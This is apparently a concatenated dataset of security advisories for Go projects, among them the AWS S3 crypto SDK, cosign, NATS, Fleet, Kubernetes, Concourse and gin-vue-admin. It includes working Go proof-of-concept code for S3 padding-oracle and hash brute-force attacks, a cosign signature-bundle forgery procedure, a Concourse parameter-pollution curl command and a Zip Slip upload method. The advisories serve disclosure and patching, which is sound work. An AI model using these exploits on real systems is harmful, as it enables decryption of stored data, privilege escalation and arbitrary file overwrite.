fullIvEnc)\n\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\", \"16\")\n\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", newData, newHeader)\n\tif input.Oracle(bucket, key+\"guess\") {\n\t\tnewHeader.Set(\"X-Amz-Meta-X-Amz-Iv\", confirmIvEnc)\n\t\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", newData, newHeader)\n\t\tif input.Oracle(bucket, key+\"guess\") {\n\t\t\treturn plaintextGuess, nil\n\t\t}\n\t}\n\treturn \"\", fmt.Errorf(\"Block %d could not be decrypted\", i)\n}\n```.

This requires the attacker to have pull and push permissions for the signature in OCI. This can happen with both standard signing with a keypair and \"keyless signing\" with Fulcio.\n\n#### Signing with a keypair\n\n<details>\n\nTo reproduce this vulnerability, create a keypair and sign an image. Don't store the signature in Rekor:\n\n```\n$ cosign generate-key-pair       \n$ cosign sign --key cosign.key IMAGE\n```\n\nIf an attacker has access to the signature in OCI, they can manipulate cosign into believing the entry was stored in Rekor even though it wasn't. To accomplish this, the attacker needs to:\n\n1. Pull the signature image\n2. Annotate the signature image with any valid Rekor bundle under the `dev.sigstore.cosign/bundle` annotation\n3. Push the signature image back to OCI\n\nVerification then prints out the following:\n\n```\n$ cosign verify [--key]  [IMAGE]\n\nVerification for [IMAGE] --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - Existence of the claims in the transparency log was verified offline\n  - The signatures were verified against the specified public key\n  - Any certificates were verified against the Fulcio roots.\n\n[\u2026]\n```\n\nThe claim that `Existence of the claims in the transparency log was verified offline` is inaccurate since an entry for this image doesn't exist in the log.\nThe claim that `Any certificates were verified against the Fulcio roots.` is technically correct but since there were no certificates that should be explicitly called out.\n\n</details>\n\n#### \"Keyless signing\" with an OIDC flow\n\n<details>\n\nTo reproduce this vulnerability, sign the image with a Fulcio identity. Don't store the signature in Rekor: \n```\n$ COSIGN_EXPERIMENTAL=1 cosign sign IMAGE\n[...]\nIMAGE appears to be a private repository, please confirm uploading to the transparency log at \"https://rekor.sigstore.dev\" [Y/N]: n\n\n```\n\nThen, create a keypair and sign the image again. Store an entry for the signature in Rekor:\n\n```\n$ cosign generate-key-pair       \n$ COSIGN_EXPERIMENTAL=1 cosign sign --key cosign.key IMAGE\n\nEnter password for private key: IMAGE appears to be a private repository, please confirm uploading to the transparency log at \"https://rekor.sigstore.dev\" [Y/N]: y\n```\n\nIf an attacker has access to the signature in OCI, they can manipulate cosign into believing the entry was stored in Rekor even though it wasn't. To accomplish this, the attacker needs to:\n\n1. Pull the signature image\n2. Copy the rekor bundle from the second signature into the first signature under the `dev.sigstore.cosign/bundle` annotation\n3. Push the signature image back to OCI\n\n_Note: For this to work, both signatures must occur during the valid lifespan of the certificate (~20 minutes)._\n\nVerification then prints out the following:\n\n```\n$ cosign verify [--key]  [IMAGE]\n\nVerification for [IMAGE] --\nThe following checks were performed on each of these signatures:\n  - The cosign claims were validated\n  - Existence of the claims in the transparency log was verified offline\n  - The signatures were verified against the specified public key\n  - Any certificates were verified against the Fulcio roots.\n\n[\u2026]\n```\n\nThe claim that `Existence of the claims in the transparency log was verified offline` is inaccurate since an entry for this image doesn't exist in the log.\n\nThe claim that `Any certificates were verified against the Fulcio roots.` is technically correct but since there were no certificates that should be explicitly called out.\n\n</details>\n\n\n### Patches\nThe vulnerability has been patched in v1.5.2 of cosign.\n\nThe `signature` in the `signedEntryTimestamp` provided by Rekor is now compared to the `signature` that is being verified. If these don't match, then an error is returned. If a valid bundle is copied to a different signature, verification should fail. \n\nCosign output now only informs the user that certificates were verified if a certificate was in fact verified.\n\n\n### Workarounds\nThe only workaround is upgrading.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cosign](https://github.com/sigstore/cosign)\n* Send us a message on [Slack](https://sigstore.slack.com/).

This hash can be used to brute force the plaintext in an offline attack, if the hash is readable to the attacker. In order to be impacted by this issue, the attacker has to be able to guess the plaintext as a whole. The attack is theoretically valid if the plaintext entropy is below the key size, i.e. if it is easier to brute force the plaintext instead of the key itself, but practically feasible only for short plaintexts or plaintexts otherwise accessible to the attacker in order to create a rainbow table.\n\nThe issue has been fixed server-side by AWS as of Aug 5th, by blocking the related metadata field. No S3 objects are affected anymore.\n\n### Mitigation\n\nThe header in question is no longer served by AWS, making this attack fully mitigated as of Aug. 5th.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository, this particular issue can be found at [here](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/hash_exploit.go):\n\n```golang\nfunc HashExploit(bucket string, key string, input *OfflineAttackInput) (string, error) {\n\t_, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tlength, err := strconv.Atoi(header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\"))\n\tplaintextMd5 := header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Md5\")\n\tblocks := length / 16\n\tpossiblePlaintextNum := 1\n\tsegNum := len(input.PossiblePlaintextSegments)\n\tfor i := 0; i < blocks; i++ {\n\t\tpossiblePlaintextNum *= segNum\n\t}\n\tfor i := 0; i < possiblePlaintextNum; i++ {\n\t\tw := i\n\t\tguess := \"\"\n\t\tfor j := 0; j < blocks; j++ {\n\t\t\tguess += input.PossiblePlaintextSegments[w%segNum]\n\t\t\tw /= segNum\n\t\t}\n\t\tguessMd5 := md5.Sum([]byte(guess))\n\t\tif plaintextMd5 == base64.StdEncoding.EncodeToString(guessMd5[:]) {\n\t\t\treturn guess, nil\n\t\t}\n\t}\n\treturn \"\", fmt.Errorf(\"No plaintext found!\")\n}\n```\n\nThe PoC will only work on old versions of the library, as the hash has been removed from being calculated as well..

Input: (This advisory is canonically <https://advisories.nats.io/CVE/CVE-2022-24450.txt>)\n\n## Problem Description\n\nNATS nats-server through 2022-02-04 has Incorrect Access Control, with unchecked ability for clients to authorize into any account, because of a coding error in a long-extant experimental feature.\n\nA client crafting the initial protocol-level handshake could, with valid credentials for any account, specify a target account and switch into it immediately.  This includes any other tenant, and includes the System account which controls nats-server core operations.\n\nFor deployments not using multi-tenancy through NATS Accounts, there is still a vulnerability: normal users are able to choose to be in the System account.\n\nAn experimental feature to provide dynamically provisioned sandbox accounts was designed to allow a server administrator to turn on an option to allow clients to dynamically request a brand new account inline at connection time.  This feature went nowhere, but lived on in the code and was used by a number of tests; support was never added to any client libraries or to the documentation.\n\nA bug in handling the feature meant that if someone did in fact have valid account credentials, then they could specify any other existing account and they would be assigned into that account.\n\nRelease 2.7.2 of nats-server removes the feature.\nBecause of the lack of client support and absence from protocol documentation, we feel this is safe operationally as well as the safest fix for the code.\n\n\n## Affected versions\n\n#### NATS Server\n * All 2.x versions up to and including 2.7.1.\n * Fixed with nats-io/nats-server: 2.7.2\n * NATS Server 1.x did not have accounts.\n * Docker image:  nats <https://hub.docker.com/_/nats>\n\n#### NATS Streaming Server\n * All versions embedding affected NATS Server:\n   + Affected: v0.15.0 up to and including v0.24.0\n   + Fixed with nats-io/nats-streaming-server: 0.24.1\n * Docker image:  nats-streaming <https://hub.docker.com/_/nats-streaming>\n\n\n## Impact\n\nExisting users could act in any account, including the System account.\n\n## Workaround\n\nNone.\n\n## Solution\n\nUpgrade the NATS server..

The attack requires write access to the bucket in question, and that the attacker has access to an endpoint that reveals decryption failures (without revealing the plaintext) and that when encrypting the CBC option was chosen as content cipher.\n\n### Risk/Severity\n\nThe vulnerability pose insider risks/privilege escalation risks, circumventing KMS controls for stored data.\n\n### Impact\n\nThis advisory describes the plaintext revealing vulnerabilities in the golang AWS S3 Crypto SDK, with a similar issue in the non \"strict\" versions of C++ and Java S3 Crypto SDKs being present as well.\n\nV1 prior to 1.34.0 of the S3 crypto SDK, allows users to encrypt files with AES-CBC, without computing a MAC on the data. Note that there is an alternative option of using AES-GCM, which is used in the examples of the documentation and not affected by this vulnerability, but by CVE-2020-8912.\n\nThis exposes a padding oracle vulnerability: If the attacker has write access to the S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file (without observing the file contents that the endpoint learns in the process), they can reconstruct the plaintext with (on average) `128*length(plaintext)` queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors.\n\nThis issue is fixed in V2 of the API, by disabling encryption with CBC mode for new files. Old files, if they have been encrypted with CBC mode, remain vulnerable until they are reencrypted with AES-GCM.\n\n### Mitigation\n\nUsing the version 2 of the S3 crypto SDK will not produce vulnerable files anymore. Old files remain vulnerable to this problem if they were originally encrypted with CBC mode.\n\n### Proof of concept\n\nA [Proof of concept](https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc) is available in a separate github repository.\n\nThis particular issue is described in [padding_oracle_exploit.go](https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/padding_oracle_exploit.go):\n\n```golang\nfunc PaddingOracleExploit(bucket string, key string, input *OnlineAttackInput) (string, error) {\n\tdata, header, err := input.S3Mock.GetObjectDirect(bucket, key)\n\tif alg := header.Get(\"X-Amz-Meta-X-Amz-Cek-Alg\"); alg != \"AES/CBC/PKCS5Padding\" {\n\t\treturn \"\", fmt.Errorf(\"Algorithm is %q, not CBC!\", alg)\n\t}\n\tlength, err := strconv.Atoi(header.Get(\"X-Amz-Meta-X-Amz-Unencrypted-Content-Length\"))\n\tpadding := byte(len(data) - length)\n\tplaintext := make([]byte, length)\n\tfor i := length - 1; i >= 0; i-- {\n\t\tnewLength := 16 * (i/16 + 1)\n\t\tdataCopy := make([]byte, newLength)\n\t\theaderCopy := header.Clone()\n\t\tcopy(dataCopy, data)\n\t\t// Set Padding\n\t\tnewPadding := byte(newLength - i)\n\t\tfor j := i + 1; j < newLength; j++ {\n\t\t\tvar oldValue byte\n\t\t\tif j >= length {\n\t\t\t\toldValue = padding\n\t\t\t} else {\n\t\t\t\toldValue = plaintext[j]\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(oldValue^newPadding, j, dataCopy, headerCopy)\n\t\t\tif err != nil {\n\t\t\t\treturn \"\", err\n\t\t\t}\n\t\t}\n\t\t// Guess\n\t\tfor c := 0; c < 256; c++ {\n\t\t\tdataCopy, headerCopy, err := xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t\tinput.S3Mock.PutObjectDirect(bucket, key+\"guess\", dataCopy, headerCopy)\n\t\t\tif input.Oracle(bucket, key+\"guess\") {\n\t\t\t\tplaintext[i] = byte(c)\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tdataCopy, headerCopy, err = xorData(byte(c)^newPadding, i, dataCopy, headerCopy)\n\t\t}\n\t}\n\treturn string(plaintext), nil\n}\n```.

A malicious or compromised Service Provider (SP) could reuse the SAML response to log into Fleet as a user -- only if the user has an account with the same email in Fleet, _and_ the user signs into the malicious SP via SAML SSO from the same Identity Provider (IdP) configured with Fleet.\n2. A user with an account in Fleet could reuse a SAML response intended for another SP to log into Fleet. This is only a concern if the user is blocked from Fleet in the IdP, but continues to have an account in Fleet. If the user is blocked from the IdP entirely, this cannot be exploited.\n\n### Patches\nFleet 4.9.1 resolves this issue.\n\n### Workarounds and good practices\n* Reduce the length of sessions on your IdP to reduce the window for malicious re-use.\n* Limit the amount of SAML Service Providers/Applications used by user accounts with access to Fleet.\n* When removing access to Fleet in the IdP, delete the Fleet user from Fleet as well.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Join us in the #fleet channel of [osquery Slack](https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw).\n* Email us at [security@fleetdm.com](mailto:security@fleetdm.com)..

Input: A security issue was discovered in the Kubelet and kube-proxy components of Kubernetes which allows adjacent hosts to reach TCP and UDP services bound to 127.0.0.1 running on the node or in the node's network namespace.

If the example service on port 1234 required no additional authentication (because it assumed that only other localhost processes could reach it), then it could be vulnerable to attacks that make use of this bug..

Input: ### Impact\nFor some Post/Put Concourse endpoint containing `:team_name` in the URL, a Concourse user can send a request with body including `:team_name=team2` to bypass team scope check to gain access to certain resources belong to any other team. The user only needs a valid user session and belongs to team2.\n\nExploitable endpoints:\n```\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/builds/:build_name\", Method: \"POST\", Name: RerunJobBuild},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/pause\", Method: \"PUT\", Name: PauseJob},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/unpause\", Method: \"PUT\", Name: UnpauseJob},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/schedule\", Method: \"PUT\", Name: ScheduleJob},\n\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/pause\", Method: \"PUT\", Name: PausePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/unpause\", Method: \"PUT\", Name: UnpausePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/expose\", Method: \"PUT\", Name: ExposePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/hide\", Method: \"PUT\", Name: HidePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/rename\", Method: \"PUT\", Name: RenamePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/archive\", Method: \"PUT\", Name: ArchivePipeline},\n\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/enable\", Method: \"PUT\", Name: EnableResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/disable\", Method: \"PUT\", Name: DisableResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/pin\", Method: \"PUT\", Name: PinResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/unpin\", Method: \"PUT\", Name: UnpinResource},\n\t\n{Path: \"/api/v1/teams/:team_name/artifacts\", Method: \"POST\", Name: CreateArtifact},\n```\n\n### Steps to reproduce\n\n1. Set up a Concourse deployment with team 1 (with pipeline 1) and team 2. User is in team 2 but not team 1.\n2. Login as user to team 2.\n```\nfly -t ci login -n team2 -u user -p password\n```\n3. Try pausing pipeline 1 in team 1 using fly. Verify the command output is `pipeline 'pipeline1' not found`.\n```\nfly -t ci pause-pipeline -p pipeline1\n```\n\n\n4. Send a customized request through `fly curl` command intend to pause pipeline 1 again. \n```\nfly -t ci curl /api/v1/teams/team1/pipelines/pipeline1/pause -- -X PUT -d \":team_name=team2\" -H \"Content-type: application/x-www-form-urlencoded\"\n```\n5. pipeline 1 in team 1 will be paused.\n\nIn step 4, the parameter pollution would allow an user from any team to pause a pipeline that belongs to other team.\n\n### Patches\nConcourse [v6.7.9](https://github.com/concourse/concourse/releases/tag/v6.7.9) and [v7.8.3](https://github.com/concourse/concourse/releases/tag/v7.8.3) were both released with a fix on October 12, 2022.\n\nInstead of using [`FormValue`](https://pkg.go.dev/net/http#Request.FormValue) to parse team_name in the request, where allows body parameters to take precedence over URL query string values, both patch versions are now using `URL.Query().Get()` over multiple scope handlers to prevent the parameter pollution.\n\n### Workarounds\nNo known workarounds for existing versions.\n\n### References\n * https://github.com/concourse/concourse/pull/8566: PR with the fix\n\n### For more information\nIf you have any questions or comments about this advisory, you may reach us privately at [security@concourse-ci.org](mailto:security@concourse-ci.org).\n.

Input: ### Impact\nGin-vue-admin < 2.5.4 has File upload vulnerabilities\u3002\nFile upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.\n\n### Patches\n\nhttps://github.com/flipped-aurora/gin-vue-admin/pull/1264\n\n### Workarounds\n\nhttps://github.com/flipped-aurora/gin-vue-admin/pull/1264\n### References\n\n#1263 \n\n### For more information\nThe plugin installation function of Gin-Vue-Admin allows users to download zip packages from the plugin market and upload them for installation. This function has an arbitrary file upload vulnerability. A malicious attacker can upload a constructed zip package to traverse the directory and upload or overwrite arbitrary files on the server side.\n\nThe affected code https://github.com/flipped-aurora/gin-vue-admin/blob/main/server/service/system/sys_auto_code.go line 880 called the `utils.Unzip` method\n\n```\npaths, err := utils.Unzip(GVAPLUGPINATH+file.Filename, GVAPLUGPINATH)\n\tpaths = filterFile(paths)\n\tvar webIndex = -1\n\tvar serverIndex = -1\n\tfor i := range paths {\n\t\tpaths[i] = filepath.ToSlash(paths[i])\n\t\tpathArr := strings.Split(paths[i], \"/\")\n\t\tln := len(pathArr)\n\t\tif ln < 2 {\n\t\t\tcontinue\n\t\t}\n\t\tif pathArr[ln-2] == \"server\" && pathArr[ln-1] == \"plugin\" {\n\t\t\tserverIndex = i\n\t\t}\n\t\tif pathArr[ln-2] == \"web\" && pathArr[ln-1] == \"plugin\" {\n\t\t\twebIndex = i\n\t\t}\n\t}\n\tif webIndex == -1 && serverIndex == -1 {\n\t\tzap.L().Error(\"\u975e\u6807\u51c6\u63d2\u4ef6\uff0c\u8bf7\u6309\u7167\u6587\u6863\u81ea\u52a8\u8fc1\u79fb\u4f7f\u7528\")\n\t\treturn webIndex, serverIndex, errors.New(\"\u975e\u6807\u51c6\u63d2\u4ef6\uff0c\u8bf7\u6309\u7167\u6587\u6863\u81ea\u52a8\u8fc1\u79fb\u4f7f\u7528\")\n\t}\n...\n```\nThe https://github.com/flipped-aurora/gin-vue-admin/blob/main/server/utils/zip.go code defines the `utils.Unzip` method\n```\n//\u89e3\u538b\nfunc Unzip(zipFile string, destDir string) ([]string, error) {\n\tzipReader, err := zip.OpenReader(zipFile)\n\tvar paths []string\n\tif err != nil {\n\t\treturn []string{}, err\n\t}\n\tdefer zipReader.Close()\n\n\tfor _, f := range zipReader.File {\n\t\tfpath := filepath.Join(destDir, f.Name)\n\t\tpaths = append(paths, fpath)\n\t\tif f.FileInfo().IsDir() {\n\t\t\tos.MkdirAll(fpath, os.ModePerm)\n...\n```\nIt can be analyzed that after uploading a zip compressed file, the `Unzip` method will be called to decompress the compressed file, and then judge whether the compressed file contains the fixed directory structure of server, web, and plugin.\n\nWhether the zip file is correct or not, it will be decompressed first. If the directory does not exist, it will be created automatically. Therefore, malicious zip packages can be constructed, and directory traversal can be performed during automatic decompression to upload or overwrite any file.\n\nUse the Zip Slip vulnerability to construct a malicious zip package with `../../../../` filenames, and upload the malicious zip package to trigger the vulnerability.\n\n![1](https://user-images.githubusercontent.com/113822259/197387942-e40c188d-cff0-4da3-84ba-7ca670d9bf72.png)\n![2](https://user-images.githubusercontent.com/113822259/197387956-cef8fd0d-978a-47ae-a65e-e28367f6a0b8.png)\n.
